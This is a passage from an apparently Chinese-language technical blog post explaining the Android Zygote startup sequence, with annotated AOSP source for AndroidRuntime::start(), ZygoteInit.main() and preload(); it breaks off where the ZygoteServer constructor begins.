zygote64(根据操作系统而来)，最后通过runtime的start()方法来真正的加载虚拟机并进入JAVA世界。<br>在app_main.cpp的最后调用了runtime.start()方法，runtime是AppRuntime的对象，AppRuntime是AndroidRuntime的子类，<br><strong>进入到AndroidRuntime.cpp#start()</strong><br><strong>frameworks/base/core/jni/AndroidRuntime.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">AndroidRuntime::start</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* className, <span class="type">const</span> Vector&lt;String8&gt;&amp; options, <span class="type">bool</span> zygote)</span></span><br><span class="line">&#123;</span><br><span class="line">    ALOGD(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt; START %s uid %d &lt;&lt;&lt;&lt;&lt;&lt;\n&quot;</span>,</span><br><span class="line">            className != <span class="literal">NULL</span> ? className : <span class="string">&quot;(unknown)&quot;</span>, getuid());</span><br><span class="line"> </span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> String8 <span class="title function_">startSystemServer</span><span class="params">(<span class="string">&quot;start-system-server&quot;</span>)</span>;</span><br><span class="line">    <span class="comment">// Whether this is the primary zygote, meaning the zygote which will fork system server.</span></span><br><span class="line">    <span class="type">bool</span> primary_zygote = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">    <span class="comment">/* start the virtual machine */</span></span><br><span class="line">    JniInvocation jni_invocation;</span><br><span class="line">    jni_invocation.Init(<span class="literal">NULL</span>);</span><br><span class="line">    JNIEnv* env;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//启动虚拟机，主要是关于虚拟机参数的设置</span></span><br><span class="line">    <span class="keyword">if</span> (startVm(&amp;mJavaVM, &amp;env, zygote, primary_zygote) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    onVmCreated(env);<span class="comment">//空函数，没有任何实现</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Register android functions.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//注册JNI方法</span></span><br><span class="line">    <span class="keyword">if</span> (startReg(env) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;Unable to register all android natives\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We want to call main() with a String array with arguments in it.</span></span><br><span class="line"><span class="comment">     * At present we have two arguments, the class name and an option string.</span></span><br><span class="line"><span class="comment">     * Create an array to hold them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    jclass stringClass;</span><br><span class="line">    jobjectArray strArray;</span><br><span class="line">    jstring classNameStr;</span><br><span class="line"> </span><br><span class="line">    stringClass = env-&gt;FindClass(<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">    assert(stringClass != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//等价 strArray[0] = &quot;com.android.internal.os.ZygoteInit&quot;</span></span><br><span class="line">    strArray = env-&gt;NewObjectArray(options.size() + <span class="number">1</span>, stringClass, <span class="literal">NULL</span>);</span><br><span class="line">    assert(strArray != <span class="literal">NULL</span>);</span><br><span class="line">    classNameStr = env-&gt;NewStringUTF(className);</span><br><span class="line">    assert(classNameStr != <span class="literal">NULL</span>);</span><br><span class="line">    env-&gt;SetObjectArrayElement(strArray, <span class="number">0</span>, classNameStr);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//strArray[1]=&quot;start-system-server&quot;;</span></span><br><span class="line">    <span class="comment">//strArray[2]=&quot;--abi-list=xxx&quot;;</span></span><br><span class="line">    <span class="comment">//其中xxx为系统响应的cpu架构类型，比如arm64-v8a</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; options.size(); ++i) &#123;</span><br><span class="line">        jstring optionsStr = env-&gt;NewStringUTF(options.itemAt(i).<span class="built_in">string</span>());</span><br><span class="line">        assert(optionsStr != <span class="literal">NULL</span>);</span><br><span class="line">        env-&gt;SetObjectArrayElement(strArray, i + <span class="number">1</span>, optionsStr);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Start VM.  This thread becomes the main thread of the VM, and will</span></span><br><span class="line"><span class="comment">     * not return until the VM exits.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//将&quot;com.android.internal.os.ZygoteInit&quot;转换为&quot;com/android/internal/os/ZygoteInit&quot;</span></span><br><span class="line">    <span class="type">char</span>* slashClassName = toSlashClassName(className != <span class="literal">NULL</span> ? className : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    jclass startClass = env-&gt;FindClass(slashClassName);<span class="comment">//找到Zygoteinit</span></span><br><span class="line">    <span class="keyword">if</span> (startClass == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;JavaVM unable to locate class &#x27;%s&#x27;\n&quot;</span>, slashClassName);</span><br><span class="line">        <span class="comment">/* keep going */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//找到这个类后，继续找成员函数main方法的Method ID</span></span><br><span class="line">        jmethodID startMeth = env-&gt;GetStaticMethodID(startClass, <span class="string">&quot;main&quot;</span>,</span><br><span class="line">            <span class="string">&quot;([Ljava/lang/String;)V&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (startMeth == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;JavaVM unable to find main() in &#x27;%s&#x27;\n&quot;</span>, className);</span><br><span class="line">            <span class="comment">/* keep going */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//通过反射调用ZygoteInit.main()方法</span></span><br><span class="line">            env-&gt;CallStaticVoidMethod(startClass, startMeth, strArray);</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">            <span class="keyword">if</span> (env-&gt;ExceptionCheck())</span><br><span class="line">                threadExitUncaughtException(env);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//释放相应对象的内存空间</span></span><br><span class="line">    <span class="built_in">free</span>(slashClassName);</span><br><span class="line"> </span><br><span class="line">    ALOGD(<span class="string">&quot;Shutting down VM\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mJavaVM-&gt;DetachCurrentThread() != JNI_OK)</span><br><span class="line">        ALOGW(<span class="string">&quot;Warning: unable to detach main thread\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mJavaVM-&gt;DestroyJavaVM() != <span class="number">0</span>)</span><br><span class="line">        ALOGW(<span class="string">&quot;Warning: VM did not shut down cleanly\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在start()方法中主要完成了：</p><ol><li>调用startVm开启虚拟机，主要是配置虚拟机的相关参数</li><li>调用startReg注册JNI方法</li><li>使用JNI把Zyogte进程启动</li></ol><p>在start()方法的最后用来反射调用了ZygoteInit的main函数，Zygote便进入了Java框架层。<br><strong>进入到ZygoteInit.java#main()</strong><br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteInit.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> &#123;</span><br><span class="line">    <span class="comment">//1.创建ZygoteServer</span></span><br><span class="line">   <span class="type">ZygoteServer</span> <span class="variable">zygoteServer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// Mark zygote start. This ensures that thread creation will throw</span></span><br><span class="line">   <span class="comment">// an error.</span></span><br><span class="line">    <span class="comment">//调用native函数，确保当前没有其它线程在运行</span></span><br><span class="line">   ZygoteHooks.startZygoteNoThreadCreation();</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// Zygote goes into its own process group.</span></span><br><span class="line">    <span class="comment">//设置pid为0，Zygote进入自己的进程组</span></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       Os.setpgid(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (ErrnoException ex) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to setpgid(0,0)&quot;</span>, ex);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   Runnable caller;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">// Store now for StatsLogging later.</span></span><br><span class="line">       <span class="keyword">final</span> <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> SystemClock.elapsedRealtime();</span><br><span class="line">       <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isRuntimeRestarted</span> <span class="operator">=</span> <span class="string">&quot;1&quot;</span>.equals(</span><br><span class="line">               SystemProperties.get(<span class="string">&quot;sys.boot_completed&quot;</span>));</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//得到systrace的监控TAG</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">bootTimeTag</span> <span class="operator">=</span> Process.is64Bit() ? <span class="string">&quot;Zygote64Timing&quot;</span> : <span class="string">&quot;Zygote32Timing&quot;</span>;</span><br><span class="line">       <span class="type">TimingsTraceLog</span> <span class="variable">bootTimingsTraceLog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TimingsTraceLog</span>(bootTimeTag,</span><br><span class="line">               Trace.TRACE_TAG_DALVIK);</span><br><span class="line">       <span class="comment">//通过systrace来追踪函数ZygoteInit，可以通过systrace工具来进行分析</span></span><br><span class="line">       <span class="comment">//traceBegin和traceEnd要成对出现，而且需要使用同一个tag</span></span><br><span class="line">       bootTimingsTraceLog.traceBegin(<span class="string">&quot;ZygoteInit&quot;</span>);</span><br><span class="line">       <span class="comment">//开启DDMS(Dalvik Debug Monitor Service)功能</span></span><br><span class="line">       <span class="comment">//注册所有已知的Java VM的处理块的监听器。线程监听、内存监听、native 堆内存监听、debug模式监听等等</span></span><br><span class="line">       RuntimeInit.preForkInit();</span><br><span class="line"> </span><br><span class="line">       <span class="type">boolean</span> <span class="variable">startSystemServer</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">zygoteSocketName</span> <span class="operator">=</span> <span class="string">&quot;zygote&quot;</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">abiList</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">enableLazyPreload</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">       <span class="comment">//2.解析app_main.cpp#start()传入的参数</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; argv.length; i++) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="string">&quot;start-system-server&quot;</span>.equals(argv[i])) &#123;</span><br><span class="line">               startSystemServer = <span class="literal">true</span>;<span class="comment">//启动zygote时，才会传入参数：start-system-server</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;--enable-lazy-preload&quot;</span>.equals(argv[i])) &#123;</span><br><span class="line">               enableLazyPreload = <span class="literal">true</span>;<span class="comment">//启动zygote_secondary时，才会传入参数：enable-lazy-preload</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[i].startsWith(ABI_LIST_ARG)) &#123;</span><br><span class="line">               abiList = argv[i].substring(ABI_LIST_ARG.length());<span class="comment">//通过属性ro.product.cpu.abilist64\ro.product.cpu.abilist32 从C空间传来的值</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[i].startsWith(SOCKET_NAME_ARG)) &#123;</span><br><span class="line">               zygoteSocketName = argv[i].substring(SOCKET_NAME_ARG.length());<span class="comment">//会有两种值：zygote和zygote_secondary</span></span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Unknown command line argument: &quot;</span> + argv[i]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">       <span class="comment">//根据传入socket name来决定是创建zygote还是zygote_secondary</span></span><br><span class="line">       <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isPrimaryZygote</span> <span class="operator">=</span> zygoteSocketName.equals(Zygote.PRIMARY_SOCKET_NAME);</span><br><span class="line">    </span><br><span class="line">       <span class="keyword">if</span> (!isRuntimeRestarted) &#123;</span><br><span class="line">           <span class="keyword">if</span> (isPrimaryZygote) &#123;</span><br><span class="line">               FrameworkStatsLog.write(FrameworkStatsLog.BOOT_TIME_EVENT_ELAPSED_TIME_REPORTED,</span><br><span class="line">                       BOOT_TIME_EVENT_ELAPSED_TIME__EVENT__ZYGOTE_INIT_START,</span><br><span class="line">                       startTime);</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (zygoteSocketName.equals(Zygote.SECONDARY_SOCKET_NAME)) &#123;</span><br><span class="line">               FrameworkStatsLog.write(FrameworkStatsLog.BOOT_TIME_EVENT_ELAPSED_TIME_REPORTED,</span><br><span class="line">                       BOOT_TIME_EVENT_ELAPSED_TIME__EVENT__SECONDARY_ZYGOTE_INIT_START,</span><br><span class="line">                       startTime);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">if</span> (abiList == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;No ABI list supplied.&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">       <span class="comment">// In some configurations, we avoid preloading resources and classes eagerly.</span></span><br><span class="line">       <span class="comment">// In such cases, we will preload things prior to our first fork.</span></span><br><span class="line">       <span class="comment">// 在第一次zygote启动时，enableLazyPreload为false，执行preload</span></span><br><span class="line">       <span class="keyword">if</span> (!enableLazyPreload) &#123;</span><br><span class="line">           <span class="comment">//systrace 追踪 ZygotePreload</span></span><br><span class="line">           bootTimingsTraceLog.traceBegin(<span class="string">&quot;ZygotePreload&quot;</span>);</span><br><span class="line">           EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_START,</span><br><span class="line">                   SystemClock.uptimeMillis());</span><br><span class="line">           <span class="comment">/// M: Added for BOOTPROF</span></span><br><span class="line">           addBootEvent(<span class="string">&quot;Zygote:Preload Start&quot;</span>);</span><br><span class="line">           <span class="comment">/// @&#125;</span></span><br><span class="line">           <span class="comment">// 3.加载进程的资源和类</span></span><br><span class="line">           preload(bootTimingsTraceLog);</span><br><span class="line">           EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_END,</span><br><span class="line">                   SystemClock.uptimeMillis());</span><br><span class="line">           <span class="comment">//systrace结束 ZygotePreload的追踪</span></span><br><span class="line">           bootTimingsTraceLog.traceEnd(); <span class="comment">// ZygotePreload</span></span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Do an initial gc to clean up after startup</span></span><br><span class="line">        bootTimingsTraceLog.traceBegin(<span class="string">&quot;PostZygoteInitGC&quot;</span>);</span><br><span class="line">        gcAndFinalize();</span><br><span class="line">        bootTimingsTraceLog.traceEnd(); <span class="comment">// PostZygoteInitGC</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment">//结束ZygoteInit的systrace追踪</span></span><br><span class="line">        bootTimingsTraceLog.traceEnd(); <span class="comment">// ZygoteInit</span></span><br><span class="line"> </span><br><span class="line">        Zygote.initNativeState(isPrimaryZygote);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/// M: Added for BOOTPROF</span></span><br><span class="line">        addBootEvent(<span class="string">&quot;Zygote:Preload End&quot;</span>);</span><br><span class="line">        <span class="comment">/// @&#125;</span></span><br><span class="line">        ZygoteHooks.stopZygoteNoThreadCreation();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 4.调用ZygoteServer 构造函数，创建socket，会根据传入的参数</span></span><br><span class="line">        <span class="comment">// 创建两个socket：/dev/socket/zygote 和 /dev/socket/zygote_secondary</span></span><br><span class="line">        zygoteServer = <span class="keyword">new</span> <span class="title class_">ZygoteServer</span>(isPrimaryZygote);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (startSystemServer) &#123;</span><br><span class="line">            <span class="comment">//5.fork出SystemServer</span></span><br><span class="line">            <span class="type">Runnable</span> <span class="variable">r</span> <span class="operator">=</span> forkSystemServer(abiList, zygoteSocketName, zygoteServer);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// &#123;@code r == null&#125; in the parent (zygote) process, and &#123;@code r != null&#125; in the</span></span><br><span class="line">            <span class="comment">// child (system_server) process.</span></span><br><span class="line">            <span class="comment">//启动SystemServer</span></span><br><span class="line">            <span class="keyword">if</span> (r != <span class="literal">null</span>) &#123;</span><br><span class="line">                r.run();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        Log.i(TAG, <span class="string">&quot;Accepting command socket connections&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// The select loop returns early in the child process after a fork and</span></span><br><span class="line">        <span class="comment">// loops forever in the zygote.</span></span><br><span class="line">        <span class="comment">//6.zygote进程进入无限循环，处理请求</span></span><br><span class="line">        caller = zygoteServer.runSelectLoop(abiList);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;System zygote died with fatal exception&quot;</span>, ex);</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (zygoteServer != <span class="literal">null</span>) &#123;</span><br><span class="line">            zygoteServer.closeServerSocket();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// We&#x27;re in the child process and have exited the select loop. Proceed to execute the</span></span><br><span class="line">    <span class="comment">// command.</span></span><br><span class="line">    <span class="keyword">if</span> (caller != <span class="literal">null</span>) &#123;</span><br><span class="line">        caller.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结zygoteInit.java#main()完成了：</p><ol><li>创建ZygoteServer</li><li>解析了从app_main.cpp#start()传入的参数</li><li>加载进程的资源和类</li><li>调用ZygoteServer构造函数，创建sokect</li><li>fork出SystemServer</li><li>zygote进程进入无限循环，处理请求</li></ol><p><strong>进入到ZygoteInit.java#preload()预加载</strong></p><p>预加载是指在zygote进程启动的时候就加载，这样系统只在zygote执行一次加载操作，所有APP用到该资源不需要再重新加载，减少资源加载时间，加快了应用启动速度，一般情况下，系统中App共享的资源会被列为预加载资源。<br>zygote fork子进程时，根据fork的copy-on-write(写时拷贝)机制可知，有些类如果不做改变，甚至都不用复制，子进程可以和父进程共享这部分数据，从而省去不少内存的占用。<br>预加载的原理：<br>zygote进程启动后将资源读取出来，保存到Resources一个全局静态变量中，下次读取系统资源的时候优先从静态变量中查找。<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteInit.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">preload</span><span class="params">(TimingsTraceLog bootTimingsTraceLog)</span> &#123;</span><br><span class="line">    Log.d(TAG, <span class="string">&quot;begin preload&quot;</span>);</span><br><span class="line">    bootTimingsTraceLog.traceBegin(<span class="string">&quot;BeginPreload&quot;</span>);</span><br><span class="line">    beginPreload();<span class="comment">//获取字符集转换资源等</span></span><br><span class="line">    bootTimingsTraceLog.traceEnd(); <span class="comment">// BeginPreload</span></span><br><span class="line">    bootTimingsTraceLog.traceBegin(<span class="string">&quot;PreloadClasses&quot;</span>);</span><br><span class="line">    <span class="comment">//预加载类的列表---/system/etc/preloaded-classes， 在/frameworks/base/config/preloaded-classes 中，Android10.0中预计有7603左右个类</span></span><br><span class="line">    preloadClasses();</span><br><span class="line">    bootTimingsTraceLog.traceEnd(); <span class="comment">// PreloadClasses</span></span><br><span class="line">    bootTimingsTraceLog.traceBegin(<span class="string">&quot;CacheNonBootClasspathClassLoaders&quot;</span>);</span><br><span class="line">    cacheNonBootClasspathClassLoaders();</span><br><span class="line">    bootTimingsTraceLog.traceEnd(); <span class="comment">// CacheNonBootClasspathClassLoaders</span></span><br><span class="line">    bootTimingsTraceLog.traceBegin(<span class="string">&quot;PreloadResources&quot;</span>);</span><br><span class="line">    <span class="comment">//加载图片、颜色等资源文件，部分定义在 /frameworks/base/core/res/res/values/arrays.xml中</span></span><br><span class="line">    preloadResources();</span><br><span class="line">    bootTimingsTraceLog.traceEnd(); <span class="comment">// PreloadResources</span></span><br><span class="line">    Trace.traceBegin(Trace.TRACE_TAG_DALVIK, <span class="string">&quot;PreloadAppProcessHALs&quot;</span>);</span><br><span class="line">    nativePreloadAppProcessHALs();</span><br><span class="line">    Trace.traceEnd(Trace.TRACE_TAG_DALVIK);</span><br><span class="line">    Trace.traceBegin(Trace.TRACE_TAG_DALVIK, <span class="string">&quot;PreloadGraphicsDriver&quot;</span>);</span><br><span class="line">    maybePreloadGraphicsDriver();</span><br><span class="line">    Trace.traceEnd(Trace.TRACE_TAG_DALVIK);</span><br><span class="line">    <span class="comment">// 加载 android、compiler_rt、jnigraphics等library</span></span><br><span class="line">    preloadSharedLibraries();</span><br><span class="line">    <span class="comment">//用于初始化文字资源</span></span><br><span class="line">    preloadTextResources();</span><br><span class="line">    <span class="comment">// Ask the WebViewFactory to do any initialization that must run in the zygote process,</span></span><br><span class="line">    <span class="comment">// for memory sharing purposes.</span></span><br><span class="line">    <span class="comment">//用于初始化webview;</span></span><br><span class="line">    WebViewFactory.prepareWebViewInZygote();</span><br><span class="line">    <span class="comment">//预加载完成，可以查看下面的log</span></span><br><span class="line">    endPreload();</span><br><span class="line">    warmUpJcaProviders();</span><br><span class="line">    Log.d(TAG, <span class="string">&quot;end preload&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    sPreloadComplete = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入到ZygoteServer.java#ZygoteServer(boolean isPrimaryZygote)<br>说明：ZygoteServer 构造函数初始化时，根据传入的参数，利用LocalServerSocket （createManagedSocketFromInitSocket()方法中调用）创建了1个本地服务端的socket，用来建立连接。<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 